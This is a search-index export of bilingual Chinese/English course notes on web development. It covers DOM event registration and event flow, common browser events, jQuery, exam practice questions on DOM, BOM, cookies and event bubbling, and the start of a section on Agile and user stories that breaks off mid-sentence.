(\u4e8b\u4ef6\u76d1\u542c\u5668)\uff0c\u4ee5\u54cd\u5e94\u8be5\u7279\u5b9a\u4e8b\u4ef6 (event handling)\u3002 \u7cfb\u7edf\u901a\u5e38\u5305\u62ec event emitters (\u4e8b\u4ef6\u6e90) \u548c\u5c06\u6709\u5173\u4e8b\u4ef6\u7684\u4fe1\u606f\u4f20\u9012\u7ed9\u5904\u7406\u7a0b\u5e8f\u7684 event objects (\u4e8b\u4ef6\u5bf9\u8c61)\u3002</p>"},{"location":"cs/mern/3403/l6/#6","title":"6. \u4e8b\u4ef6\u9a71\u52a8\u7f16\u7a0b\u5728\u6d4f\u89c8\u5668\u4e2d\u7684\u5b9e\u73b0\u65b9\u5f0f (\u4e8b\u4ef6\u6ce8\u518c, \u4e8b\u4ef6\u6d41)","text":"<p>Browser's Role (\u6d4f\u89c8\u5668\u89d2\u8272): Web \u6d4f\u89c8\u5668\u672c\u8eab\u7ba1\u7406\u4e00\u4e2a event loop (\u4e8b\u4ef6\u5faa\u73af)\uff0c\u76d1\u542c\u5404\u79cd\u4e8b\u4ef6\u3002\u8fd9\u4e9b\u5305\u62ec\u7528\u6237\u4ea4\u4e92 (\u4f8b\u5982\uff0c\u70b9\u51fb\u3001\u952e\u76d8\u8f93\u5165) \u548c\u6d4f\u89c8\u5668\u751f\u6210\u7684\u4e8b\u4ef6 (\u4f8b\u5982\uff0c\u9875\u9762\u52a0\u8f7d\u5b8c\u6210\u3001\u6765\u81ea\u670d\u52a1\u5668\u7684\u54cd\u5e94)\u3002 \u5f53\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u6d4f\u89c8\u5668\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u4e8b\u4ef6\u76d1\u542c\u5668\u6ce8\u518c\u5728\u8be5\u76f8\u5173 HTML \u5143\u7d20\u4e0a\u9488\u5bf9\u8be5\u4e8b\u4ef6\uff0c\u7136\u540e\u8c03\u7528\u5b83\u4eec\u3002</p> <p>Event Listener Registration (\u4e8b\u4ef6\u76d1\u542c\u5668\u6ce8\u518c): \u4e3a\u4e86\u8ba9\u6d4f\u89c8\u5668\u77e5\u9053\u4e3a\u67d0\u4e2a\u4e8b\u4ef6\u6267\u884c\u54ea\u4e2a\u4ee3\u7801\uff0c\u5fc5\u987b\u5c06 event listeners (\u4e8b\u4ef6\u76d1\u542c\u5668) \u6ce8\u518c (\u5373\u9644\u52a0) \u5230\u7279\u5b9a HTML \u5143\u7d20\u7684\u7279\u5b9a\u4e8b\u4ef6\u7c7b\u578b\u4e0a\u3002 \u6ce8\u518c\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u4e3b\u8981\u6709\u4e09\u79cd\u65b9\u5f0f\uff1a</p> <ol> <li>HTML \u4e8b\u4ef6\u5c5e\u6027\uff1a\u76f4\u63a5\u5728 HTML \u6807\u8bb0\u4e2d\u5c06 JavaScript \u4ee3\u7801\u5206\u914d\u7ed9\u50cf <code>onclick</code> \u8fd9\u6837\u7684\u5c5e\u6027 (\u4f8b\u5982 <code>&lt;button onclick=\"myFunction()\"&gt;</code>)\u3002</li> <li>DOM \u5143\u7d20\u5c5e\u6027\uff1a\u5c06 JavaScript \u51fd\u6570\u5206\u914d\u7ed9 DOM \u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027 (\u4f8b\u5982 <code>element.onclick = myFunction;</code>)\u3002\u4f7f\u7528\u6b64\u65b9\u6cd5\u65f6\uff0c\u91cd\u8981\u7684\u662f\u811a\u672c\u53ef\u4ee5\u8bbf\u95ee\u51fd\u6570\u5b9a\u4e49\u548c\u5143\u7d20\u5bf9\u8c61\uff0c\u5e76\u4e14\u60a8\u5206\u914d\u7684\u662f\u5bf9\u51fd\u6570\u7684\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u8c03\u7528\u5b83\u3002</li> <li><code>addEventListener()</code> \u65b9\u6cd5\uff1a\u8fd9\u662f\u6700\u7075\u6d3b\u4e14\u63a8\u8350\u7684\u65b9\u6cd5 (\u4f8b\u5982 <code>element.addEventListener('click', myFunction, false);</code>)\u3002\u5b83\u5141\u8bb8\u4e3a\u540c\u4e00\u4e8b\u4ef6\u6dfb\u52a0\u591a\u4e2a\u76d1\u542c\u5668\uff0c\u5bf9\u4e8b\u4ef6\u6d41 (\u6355\u83b7\u9636\u6bb5\u4e0e\u5192\u6ce1\u9636\u6bb5) \u63d0\u4f9b\u66f4\u591a\u63a7\u5236\uff0c\u5e76\u4fc3\u8fdb JavaScript \u903b\u8f91\u4e0e HTML \u7ed3\u6784\u7684\u66f4\u597d\u5206\u79bb\u3002</li> </ol> <p>Event Flow (\u4e8b\u4ef6\u6d41): \u5f53\u4e8b\u4ef6\u53d1\u751f\u5728 HTML \u5143\u7d20 (\u76ee\u6807\u8282\u70b9) \u4e0a\u65f6\uff0c\u5b83\u4e0d\u4ec5\u5f71\u54cd\u8be5\u5355\u4e2a\u5143\u7d20\u3002\u5176\u5728 DOM \u6811\u4e2d\u7684\u7956\u5148\u5143\u7d20\u4e5f\u53ef\u4ee5\u5bf9\u8be5\u4e8b\u4ef6\u505a\u51fa\u53cd\u5e94\u3002\u8fd9\u4e9b\u5143\u7d20\u63a5\u6536\u4e8b\u4ef6\u7684\u987a\u5e8f\u79f0\u4e3a event flow (\u4e8b\u4ef6\u6d41)\uff0c\u5b83\u6709\u4e09\u4e2a\u9636\u6bb5\uff1a</p> <ol> <li>Capturing Phase (\u6355\u83b7\u9636\u6bb5): \u4e8b\u4ef6\u4ece <code>window</code> (\u6216\u6587\u6863\u6839) \u5411\u4e0b\u4f20\u64ad\u5230\u76ee\u6807\u5143\u7d20\u7684\u7236\u5143\u7d20\u3002\u5728\u7956\u5148\u5143\u7d20\u4e0a\u4e3a\u6355\u83b7\u9636\u6bb5\u6ce8\u518c\u7684\u4e8b\u4ef6\u76d1\u542c\u5668\u88ab\u89e6\u53d1\u3002</li> <li>Target Phase (\u76ee\u6807\u9636\u6bb5): \u4e8b\u4ef6\u5230\u8fbe\u76ee\u6807\u5143\u7d20\u672c\u8eab\u3002\u5728\u76ee\u6807\u5143\u7d20\u4e0a\u6ce8\u518c\u7684\u4e8b\u4ef6\u76d1\u542c\u5668\u88ab\u89e6\u53d1\u3002</li> <li>Bubbling Phase (\u5192\u6ce1\u9636\u6bb5): \u4e8b\u4ef6\u4ece\u76ee\u6807\u5143\u7d20\u7684\u7236\u5143\u7d20\u5411\u4e0a\u5192\u6ce1\u56de <code>window</code>\u3002\u5728\u7956\u5148\u5143\u7d20\u4e0a\u4e3a\u5192\u6ce1\u9636\u6bb5 (\u5927\u591a\u6570\u65b9\u6cd5\u7684\u9ed8\u8ba4\u8bbe\u7f6e) \u6ce8\u518c\u7684\u4e8b\u4ef6\u76d1\u542c\u5668\u88ab\u89e6\u53d1\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5927\u591a\u6570\u4e8b\u4ef6\u5904\u7406\u53d1\u751f\u5728\u5192\u6ce1\u9636\u6bb5\u3002 \u67d0\u4e9b\u4e8b\u4ef6\uff0c\u5982 <code>focus</code>\u3001<code>blur</code>\u3001<code>load</code> \u548c <code>unload</code>\uff0c\u4e0d\u4f1a\u5192\u6ce1\u3002 \u4e00\u4e2a\u5305\u542b\u4e8b\u4ef6\u8be6\u7ec6\u4fe1\u606f (\u4f8b\u5982\uff0c\u9f20\u6807\u4e8b\u4ef6\u7684\u9f20\u6807\u5750\u6807\uff0c\u6216\u76ee\u6807\u5143\u7d20) \u7684 event object (\u4e8b\u4ef6\u5bf9\u8c61) \u4f1a\u81ea\u52a8\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u3002 \u53ef\u4ee5\u4f7f\u7528\u4e8b\u4ef6\u5bf9\u8c61\u4e0a\u7684 <code>stopPropagation()</code> \u7b49\u65b9\u6cd5\u6765\u963b\u6b62\u4e8b\u4ef6\u5728\u94fe\u4e2d\u8fdb\u4e00\u6b65\u4f20\u64ad\u3002</li> </ol>"},{"location":"cs/mern/3403/l6/#7","title":"7. \u7406\u89e3\u4e00\u4e9b\u5e38\u89c1\u4e8b\u4ef6\u7684\u76ee\u7684","text":"<ul> <li>click: \u5f53\u7528\u9f20\u6807\u70b9\u51fb\u5143\u7d20\u65f6\u89e6\u53d1\u3002</li> <li>load: \u5f53\u6574\u4e2a\u9875\u9762\u53ca\u5176\u6240\u6709\u8d44\u6e90 (\u56fe\u50cf\u3001\u6837\u5f0f\u8868\u3001\u811a\u672c) \u5b8c\u6210\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002</li> <li>mouseover / mouseout: \u5206\u522b\u5728\u9f20\u6807\u6307\u9488\u8fdb\u5165\u6216\u79bb\u5f00\u5143\u7d20\u8fb9\u754c\u65f6\u89e6\u53d1\u3002</li> <li>mousemove: \u5f53\u9f20\u6807\u6307\u9488\u5728\u5143\u7d20\u4e0a\u79fb\u52a8\u65f6\u91cd\u590d\u89e6\u53d1\u3002</li> <li>keydown / keyup / keypress: \u54cd\u5e94\u952e\u76d8\u6309\u952e\u64cd\u4f5c (\u952e\u6309\u4e0b\u3001\u952e\u91ca\u653e\u3001\u5b57\u7b26\u952e\u6309\u4e0b) \u800c\u89e6\u53d1\u3002</li> <li>focus / blur: \u5206\u522b\u5728\u5143\u7d20\u83b7\u5f97\u6216\u5931\u53bb\u952e\u76d8\u7126\u70b9\u65f6\u89e6\u53d1 (\u4f8b\u5982\uff0c\u70b9\u51fb\u6587\u672c\u5b57\u6bb5\u6216\u4ece\u4e2d\u5207\u51fa)\u3002</li> <li>change: \u5f53\u8f93\u5165\u5143\u7d20\u3001\u9009\u62e9\u6846\u6216\u6587\u672c\u533a\u57df\u7684\u503c\u66f4\u6539\u5e76\u4e14\u5143\u7d20\u5931\u53bb\u7126\u70b9\u65f6\u89e6\u53d1\u3002</li> <li>submit: \u5728 <code>&lt;form&gt;</code> \u5143\u7d20\u5373\u5c06\u63d0\u4ea4\u65f6\u89e6\u53d1\u3002\u6b64\u4e8b\u4ef6\u901a\u5e38\u7528\u4e8e\u5728\u5c06\u6570\u636e\u53d1\u9001\u5230\u670d\u52a1\u5668\u4e4b\u524d\u6267\u884c\u5ba2\u6237\u7aef\u8868\u5355\u9a8c\u8bc1\u3002\u5982\u679c\u9a8c\u8bc1\u5931\u8d25\uff0c\u53ef\u4ee5\u963b\u6b62\u63d0\u4ea4\u3002</li> <li>unload: \u5f53\u9875\u9762\u5373\u5c06\u5378\u8f7d\u65f6\u89e6\u53d1 (\u4f8b\u5982\uff0c\u5bfc\u822a\u79bb\u5f00\u6216\u5173\u95ed\u6807\u7b7e\u9875/\u7a97\u53e3\u65f6)\u3002</li> </ul>"},{"location":"cs/mern/3403/l6/#8-jquery","title":"8. jQuery \u7684\u76ee\u7684","text":"<p>jQuery \u662f\u4e00\u4e2a\u6d41\u884c\u7684 JavaScript \u5e93\uff0c\u65e8\u5728\u7b80\u5316\u5ba2\u6237\u7aef HTML DOM \u64cd\u4f5c\u548c\u4e8b\u4ef6\u5904\u7406\uff0c\u4ee5\u53ca\u5176\u4ed6\u5e38\u89c1\u7684 JavaScript \u4efb\u52a1\uff0c\u5982 AJAX \u4ea4\u4e92\u548c\u52a8\u753b\u3002 \u5176\u4e3b\u8981\u76ee\u6807\u662f\u4f7f\u5176\u66f4\u5bb9\u6613\u3001\u66f4\u7b80\u6d01\u5730\u7f16\u5199\u4e0e\u7f51\u9875\u4ea4\u4e92\u7684 JavaScript \u4ee3\u7801\uff0c\u5176\u53e3\u53f7\u662f \"write less, do more (\u5199\u5f97\u66f4\u5c11\uff0c\u505a\u5f97\u66f4\u591a)\"\u3002 \u5b83\u65e8\u5728\u89e3\u51b3\u65e9\u671f Web \u5f00\u53d1\u4e2d\u6838\u5fc3 JavaScript DOM \u64cd\u4f5c\u7684\u5197\u957f\u548c\u8de8\u6d4f\u89c8\u5668\u4e0d\u4e00\u81f4\u6027\u95ee\u9898\u3002 jQuery \u63d0\u4f9b\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ul> <li>\u9009\u62e9\u548c\u64cd\u4f5c DOM \u5143\u7d20\u3002</li> <li>\u4fee\u6539 CSS \u6837\u5f0f\u3002</li> <li>\u5904\u7406 HTML \u4e8b\u4ef6\u3002</li> <li>\u521b\u5efa\u6548\u679c\u548c\u52a8\u753b\u3002</li> <li>\u53d1\u51fa AJAX \u8bf7\u6c42\u3002</li> </ul> <p>\u5173\u4e8e\u4ee3\u7801\u7684\u8003\u8bd5\u8981\u6c42\u8bf4\u660e: \u5bf9\u4e8e\u8003\u8bd5\uff0c\u4f60\u9700\u8981\u80fd\u591f \u9605\u8bfb\u548c\u4fee\u590d \u4e0e DOM \u548c BOM \u64cd\u4f5c\u76f8\u5173\u7684 JavaScript \u4ee3\u7801\u3002\u4f60 \u4e0d\u9700\u8981 \u4ece\u5934\u5f00\u59cb\u7f16\u5199\u8fd9\u4e9b JavaScript \u4ee3\u7801\u3002 \u4f60 \u4e0d\u9700\u8981 \u9605\u8bfb\u3001\u4fee\u590d\u6216\u7f16\u5199 jQuery \u4ee3\u7801\u3002</p>"},{"location":"cs/mern/3403/l6_ex/","title":"6.1 Exam QAs","text":""},{"location":"cs/mern/3403/l6_ex/#q1","title":"Q1","text":"<p>What is the primary purpose of the Document Object Model (DOM) in web development?</p> <p>To provide a way for scripts to dynamically access and update the content, structure, and style of web documents. This aligns with the DOM's role as an API for HTML documents, allowing programmatic manipulation.</p> <p>\u6587\u6863\u5bf9\u8c61\u6a21\u578b\u662f\u5e73\u53f0\u548c\u8bed\u8a00\u4e2d\u7acb\u7684\u63a5\u53e3\uff0c\u5b83\u5c06\u5141\u8bb8\u7a0b\u5e8f\u548c\u811a\u672c\u52a8\u6001\u8bbf\u95ee\u548c\uf901\u65b0\u6587\u6863\u7684\u5185\u5bb9\uff0c\u7ed3\u6784\u548c\u6837\u5f0f\u3002\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5904\uf9e4\u8be5\u6587\u6863\uff0c\u5e76\u4e14\u8be5\u5904\uf9e4\u7684\u7ed3\u679c\u53ef\u4ee5\u56de\u5230\u5448\u73b0\u7684\u9875\u9762\u4e2d\u3002 <code>getElementsbytagname</code> \u8fd9\u79cd\uff0c <code>documents.pet.catNam</code> \u8bbf\u95ee\uff0c\u5e76\u4e14\u901a\u8fc7\u8fd9\u4e9b\u65b9\u6cd5\u5728\u9875\u9762\u52a0\u8f7d\u540e\u6539\u53d8\u9875\u9762</p> <p></p>"},{"location":"cs/mern/3403/l6_ex/#q2","title":"Q2","text":"<p>Which of the following best describes the Browser Object Model (BOM)?</p> <p>DOM \u662f BOM \u7684\u5176\u4e2d\u4e00\u4e2a\u5206\u652f\uff0c\u5305\u542b\u6d4f\u89c8\u5668\u6267\u884c\u73af\u5883\u7b49\u7279\u70b9</p> <p></p> <p></p> <p>The BOM allows interaction with the browser window and environment, which is distinct from the document's content.</p>"},{"location":"cs/mern/3403/l6_ex/#q3","title":"Q3","text":"<p>What is a key difference between web storage (like localStorage) and cookies?</p> <p>http\uff08s\uff09\u8bf7\u6c42\u662f\u65e0\u72b6\u6001\u7684\uff0c\u4e00\u65e6\u7528\u6237\u5c06\u8fdc\u79bb\u7f51\u9875\u5bfc\u822a\u540e\uff0c\u670d\u52a1\ufa38\u548c\u5ba2\u6237\u7aef\u90fd\uf967\u4f1a\u7ef4\u62a4\u4fe1\u606f\u3002</p> <p>cookie\u662f\u4e00\u4e2a\u5305\u542b\u952e\u503c\u5bf9\u7684\u5b57\u7b26\uf905\uff0c\u6700\u59274KB\u6587\u672c\u6587\u4ef6\u53ef\u901a\u8fc7 document.cookie \u8bbf\u95ee\uff1bcookies\u6307\u5b9a\u6709\u6548\u671f\uff0c\u6216\u8005\u5728\u5173\u95ed\u6d4f\u89c8\ufa38\u65f6\u5c06\u5220\u9664\u3002</p> <p>\u672c\u5730\u5b58\u50a8\u662f\u4e00\u4e2a\u952e\u503c\u5b57\u5178\uff0c\u5176\u4e2d\u503c\u5b58\u50a8\u4e3a\u5b57\u7b26\uf905\uff1b\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u672c\u5730\u5b58\u50a8\u4ec5\u5728\u5ba2\u6237\u7aef\u53ef\u7528\uff0c\u50a8\u5b58\u66f4\u591a\u5bb9\u91cf 10MB \u8fd9\u6837</p> <ol> <li>cookies are automatically sent by the browser with every HTTP request to the domain that set them.  This allows servers to read information like session IDs or user preferences.</li> <li>Web storage also allows websites to store data in a user's browser. However, unlike cookies, data in localStorage or sessionStorage is not automatically transmitted with every HTTP request.  It's primarily for client-side storage and manipulation. If a server needs this information, it must be explicitly sent by the client-side JavaScript code (e.g., as part of an AJAX request).</li> </ol>"},{"location":"cs/mern/3403/l6_ex/#q4","title":"Q4","text":"<p>What is a fundamental characteristic of event-driven programming in the context of web browsers?</p> <p>\u7531\u9f20\u6807\u70b9\u51fb\uff0c\u952e\u76d8\u6309\u952e\u4e4b\u7c7b\u7684\u9a71\u52a8\uff1b\u4ee3\u8868\u6709 Ajax, JS Callback</p> <p>\u4e8b\u4ef6\u7684\u4e00\u4e2a\u91cd\u8981\u7528\u9014\u662f\u9a8c\u8bc1\u8868\u5355\u5185\u5bb9\uff0c\u800c\u65e0\u9700\u4f7f\u7528\u5e26\u5bbd\u548c\u65f6\u95f4\u8bbf\u95ee\u8fdc\u7a0b\u670d\u52a1\ufa38\u3002</p> <p>The program's flow is primarily determined by the occurrence of events, such as user actions or messages from other programs.</p> <p></p>"},{"location":"cs/mern/3403/l6_ex/#q5","title":"Q5","text":"<p>According to the lecture, what is generally the recommended modern approach for registering an event handler in JavaScript for better separation of concerns and flexibility?</p> <p>\u7528 <code>addEventlistener()</code> \u51fd\u6570\uff1b</p> <ol> <li><code>&lt;button onclick=\"...\"&gt;</code>\u8fd9\u6837\u7684\u662f\u4e00\u79cd\u65e9\u671f\u65b9\u6cd5\uff1b\u5173\u6ce8\u70b9\u65e0\u6cd5\u5206\u79bb\u4e0e HTML \u6df7\u5728\u4e00\u8d77\u96be\u4ee5\u7ef4\u62a4\u9605\u8bfb</li> </ol> <p>\u7075\u6d3b\u6027\u5dee\uff0c\u4e00\u4e2a\u4e8b\u4ef6\u5c5e\u6027\u53ea\u80fd <code>assign</code> \u4e00\u4e2a\u51fd\u6570\uff0c\u6dfb\u52a0\u591a\u4e2a\u4e0d\u65b9\u4fbf</p> <ol> <li><code>element.onclick = myFunction;</code></li> </ol> <p>\u5c06 JS \u4ee3\u7801\u8fc1\u79fb\u5230\u4e86 <code>&lt;script&gt;</code> \u6807\u7b7e\uff1a\u53ea\u80fd\u6307\u5411\u4e00\u4e2a\u51fd\u6570\uff0c\u65b0\u7684\u4f1a\u8986\u76d6\u65e7\u7684</p>"},{"location":"cs/mern/3403/l6_ex/#q6","title":"Q6","text":"<p>In the context of DOM event flow, what does \"event bubbling\" refer to?</p> <p>\u5728HTML DOM\u4e2d\uff0c\u5f53\u4e00\u4e2a\u4e8b\u4ef6\uff08\u6bd4\u5982\u70b9\u51fb\uff09\u53d1\u751f\u5728\u4e00\u4e2a\u5143\u7d20\u4e0a\u65f6\uff0c\u5b83\u5e76\u4e0d\u4ec5\u4ec5\u53ea\u5f71\u54cd\u8be5\u5143\u7d20\u3002\u4e8b\u4ef6\u4f1a\u7ecf\u5386\u4e00\u4e2a\u79f0\u4e3a\u201c\u4e8b\u4ef6\u6d41\u201d\u7684\u8fc7\u7a0b\uff0c\u4e8b\u4ef6\u5192\u6ce1\u63cf\u8ff0\u7684\u662f\u5f53\u4e00\u4e2a\u4e8b\u4ef6\u5728DOM\u6811\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\uff08\u76ee\u6807\u8282\u70b9\uff09\u4e0a\u88ab\u89e6\u53d1\u540e\uff0c\u8be5\u4e8b\u4ef6\u4f1a\u63a5\u7740\u5411\u4e0a\u4f20\u64ad\uff0c\u4f9d\u6b21\u89e6\u53d1\u5176\u6240\u6709\u7236\u5143\u7d20\uff08\u7956\u5148\u8282\u70b9\uff09\uff0c\u4e00\u76f4\u5230\u6587\u6863\u7684\u6839\u8282\u70b9\u3002\u5728\u5927\u591a\u6570\u6d4f\u89c8\u5668\u4e2d\uff0c\u4e8b\u4ef6\u5904\u7406\u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u5728\u5192\u6ce1\u9636\u6bb5\u8fdb\u884c \u3002</p> <p>A. The event triggers handlers on sibling elements simultaneously.</p> <p>\u8fd9\u4e2a\u9009\u9879\u63cf\u8ff0\u7684\u662f <code>event capturing</code></p> <p>B. The event is first handled by the outermost ancestor (document root) and then propagates down to the target element.</p> <p>\u8bf4\u53cd\u4e86</p> <p>C. Only the target element that directly received the event can handle it.</p> <p>\u4e0d\u5bf9\uff0c\u6709\u4e8b\u4ef6\u6355\u83b7\u548c\u4e8b\u4ef6\u5192\u6ce1\u8fd9\u6837\u7684\u4e8b\u4ef6\u6d41\u673a\u5236\uff0c\u624d\u5141\u8bb8\u591a\u4e2a\u5143\u7d20\uff08\u76ee\u6807\u5143\u7d20\u53ca\u5176\u7956\u5148\u5143\u7d20\uff09\u54cd\u5e94\u540c\u4e00\u4e2a\u4e8b\u4ef6 </p> <p>D. The event is handled by the target element first, and then propagates up through its ancestors towards the document root.</p>"},{"location":"cs/mern/3403/l6_ex/#q7","title":"Q7","text":"<p>What is the primary purpose of the <code>load</code> event in the browser?</p> <p><code>load</code> \u4e8b\u4ef6\u76ee\u7684\u662f\u544a\u8bc9\u4f60\u7684 Js \u6574\u4e2a\u9875\u9762\u4ee5\u53ca\u5176\u6240\u6709\u4f9d\u8d56\u7684\u6240\u6709\u8d44\u6e90\u90fd\u5df2\u7ecf\u5168\u90e8\u52a0\u8f7d\u5b8c\u6bd5\uff0c\u8d44\u6e90\u5305\u62ec\uff1a</p> <ul> <li>CSS</li> <li>JS</li> <li>images</li> <li>iframes</li> </ul> <p>It fires when the entire page has finished loading, including all dependent resources like images and scripts.</p>"},{"location":"cs/mern/3403/l6_ex/#q8","title":"Q8","text":"<p>According to the lecture, what was a primary motivation for the development and popularity of jQuery?</p> <p>To provide a more concise and easier way to manipulate the DOM and handle events compared to early verbose native JavaScript.</p> <p>\u53ef\u4ee5\u7528 CDN \u8bbf\u95ee\uff0c\u8bed\u6cd5\u662f <code>$\uff08selector\uff09.Action\uff08\uff09</code></p>"},{"location":"cs/mern/3403/l6_ex/#q9","title":"Q9","text":"<p>The lecture mentions two common data formats frequently used with AJAX requests for exchanging structured data between the client and server. What are these two formats?</p> <p>XML \u548c JSON</p>"},{"location":"cs/mern/3403/l6_ex/#q10","title":"Q10","text":"<p>Which of the following describes a general capability of JavaScript when interacting with the DOM, without needing to know specific method names?</p> <p>JavaScript can add new HTML elements, change existing content, and modify styles after the page has loaded.</p>"},{"location":"cs/mern/3403/l7/","title":"7.0 Agile and Git","text":""},{"location":"cs/mern/3403/l7/#differences-between-agile-and-waterfall","title":"Differences between Agile and Waterfall","text":"<ul> <li>Waterfall Model (\u7011\u5e03\u6a21\u578b)\uff1a</li> <li>Manage the project in strict sequential phases. \u4f8b\u5982\uff0c\u8c03\u7814\u5b8c\u6210\u540e\u624d\u80fd\u5f00\u59cb\u8bbe\u8ba1\uff0c\u8bbe\u8ba1\u7b7e\u7f72\u540e\u624d\u80fd\u5f00\u59cb\u5f00\u53d1\u3002</li> <li>\u5982\u679c\u7011\u5e03\u6a21\u578b\u7684\u8f6f\u4ef6\u9879\u76ee\u51fa\u9519\uff0c\u5f80\u5f80\u4f1a\u9519\u5f97\u5f88\u4e25\u91cd\u3002</li> <li>Agile Development (\u654f\u6377\u5f00\u53d1)\uff1a</li> <li>\u65e8\u5728\u7ba1\u7406\u9879\u76ee\u5e76\u5728\u4e8b\u60c5\u51fa\u9519\u65f6\u6700\u5c0f\u5316\u95ee\u9898\u3002</li> <li>\u5c06\u5927\u578b\u9879\u76ee\u5206\u89e3\u4e3a\u79f0\u4e3aiterations (\u8fed\u4ee3) \u7684\u5c0f\u578b\u3001\u53ef\u7ba1\u7406\u7684\u533a\u5757\u3002</li> <li>Development is iterative, while the waterfall model is a one-time activity.</li> <li>Planning is adaptive, while the waterfall model follows the original plan.</li> <li>In agile, the characters are blurred, while in the waterfall model, the characters are clear.</li> <li>Agile welcomes changes in requirements, while the Waterfall model resists changes.</li> <li>Agile uses working software as the primary measure, while the Waterfall model may focus more on documentation.</li> </ul>"},{"location":"cs/mern/3403/l7/#core-agile-development-cycle","title":"Core agile development cycle","text":"<p>\u654f\u6377\u5f00\u53d1\u662f\u4e00\u4e2a\u6301\u7eed\u7684\u5faa\u73af\u8fc7\u7a0b\uff0c\u5176\u6838\u5fc3\u5468\u671f\u5305\u62ec\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ol> <li>Iterations (\u8fed\u4ee3)\uff1a\u5c06\u5927\u578b\u9879\u76ee\u5206\u89e3\u4e3a\u5c0f\u578b\u3001\u53ef\u7ba1\u7406\u7684\u3001\u56fa\u5b9a\u65f6\u95f4\u95f4\u9694\u7684\u8fed\u4ee3\u5468\u671f\u3002</li> <li>\u6709\u4ef7\u503c\u7684\u4ea7\u51fa\uff1a\u5728\u6bcf\u6b21\u8fed\u4ee3\u7ed3\u675f\u65f6\uff0c\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e9b\u6709\u4ef7\u503c\u7684\u4e1c\u897f\uff08\u4f8b\u5982\uff0c\u53ef\u5de5\u4f5c\u7684\u8f6f\u4ef6\u529f\u80fd\uff09\u3002</li> <li>\u7528\u6237\u53cd\u9988\uff1a\u8fed\u4ee3\u7684\u4ea7\u51fa\u5e94\u8be5\u80fd\u591f\u88ab\u53d1\u5e03\u4ee5\u83b7\u53d6\u7528\u6237\u6216\u5229\u76ca\u76f8\u5173\u8005\u7684\u53cd\u9988\u3002</li> <li>\u8fed\u4ee3\u5185\u7684\u9636\u6bb5\uff08\u5728\u4e00\u4e2a\u8fed\u4ee3\u4e2d\u4f1a\u7ecf\u5386\uff09\uff1a    - \u6839\u636e\u96be\u5ea6\u548c\u4f18\u5148\u7ea7\u5bf9\u5f53\u524d\u671f\u671b\u7684\u529f\u80fd\u5217\u8868\u8fdb\u884c\u6392\u5e8f\u3002    - \u5f00\u59cb\u5f00\u53d1\u5217\u8868\u4e2d\u6700\u9876\u7aef\u7684\u7279\u6027\u3002    - \u5728\u8fed\u4ee3\u7ed3\u675f\u65f6\uff0c\u5411\u7528\u6237\u5c55\u793a\u5df2\u5b8c\u6210\u7684\u5de5\u4f5c\u3002    - \u66f4\u65b0\u529f\u80fd\u5217\u8868\uff1a\u79fb\u9664\u5df2\u5b8c\u6210\u7684\u529f\u80fd\uff0c\u6839\u636e\u7528\u6237\u53cd\u9988\u6dfb\u52a0\u65b0\u529f\u80fd\u5e76\u91cd\u65b0\u6392\u5217\u73b0\u6709\u529f\u80fd\u7684\u4f18\u5148\u7ea7\u3002    - \u5206\u6790 (Analysis)\u3001\u6d4b\u8bd5 (Test)\u3001\u8bbe\u8ba1 (Design)\u3001\u7f16\u7801 (Code) \u8fd9\u4e9b\u6d3b\u52a8\u5728\u654f\u6377\u4e2d\u662f\u6301\u7eed\u8fdb\u884c\u7684\uff0c\u800c\u4e0d\u662f\u50cf\u7011\u5e03\u6a21\u578b\u90a3\u6837\u4f5c\u4e3a\u4e00\u6b21\u6027\u7684\u9636\u6bb5\u3002</li> </ol>"},{"location":"cs/mern/3403/l7/#how-user-stories-can-be-used-for-planning-and-time-estimation","title":"How user stories can be used for planning and time estimation","text":"<ul> <li>Planning (\u89c4\u5212)\uff1a</li> <li>User stories (\u7528\u6237\u6545\u4e8b) \u662f\u4ece\u6700\u7ec8\u7528\u6237\u7684\u89d2\u5ea6\u63cf\u8ff0\u8f6f\u4ef6\u7684\u4e00\u4e2a\u671f\u671b\u529f\u80fd\u3002</li> <li>\u5b83\u4eec\u5c06\u9700\u6c42\u5206\u89e3\u4e3a\u53ef\u4ee5\u5728\u77ed\u65f6\u95f4\u5185\u4ea4\u4ed8\u7684\u5c0f\u5de5\u4f5c\u5355\u5143\u3002</li> <li>\u6240\u6709\u7528\u6237\u6545\u4e8b\u6784\u6210\u4e00\u4e2a\u4e3b\u6545\u4e8b\u5217\u8868 (Master story list) \u6216\u4ea7\u54c1\u5f85\u529e\u4e8b\u9879\u5217\u8868 (Product Backlog)\u3002</li> <li>\u5728\u6bcf\u6b21\u8fed\u4ee3\u5f00\u59cb\u65f6\uff0c\u56e2\u961f\u4ece\u8fd9\u4e2a\u5217\u8868\u4e2d\u9009\u62e9\u4e00\u90e8\u5206\u6545\u4e8b\u8fdb\u884c\u5f00\u53d1\uff0c\u5f62\u6210\u8fed\u4ee3\u8ba1\u5212\u3002</li> <li>\u7528\u6237\u6545\u4e8b\u6709\u52a9\u4e8e\u56e2\u961f\u548c\u5229\u76ca\u76f8\u5173\u8005\u5c31\u9700\u6c42\u8fbe\u6210\u5171\u8bc6\u3002</li> <li>Time Estimation (\u65f6\u95f4\u4f30\u7b97)\uff1a</li> <li>\u4e3a\u529f\u80fd\u7279\u6027\u8fdb\u884c\u65f6\u95f4\u4f30\u7b97\u662f\u56f0\u96be\u4f46\u5fc5\u8981\u7684\u3002</li> <li>\u56e2\u961f\u901a\u5e38\u4f1a\u5bf9\u7528\u6237\u6545\u4e8b\u8fdb\u884c\u4f30\u7b97\uff0c\u4f8b\u5982\u4f7f\u7528Story Points (\u6545\u4e8b\u70b9) 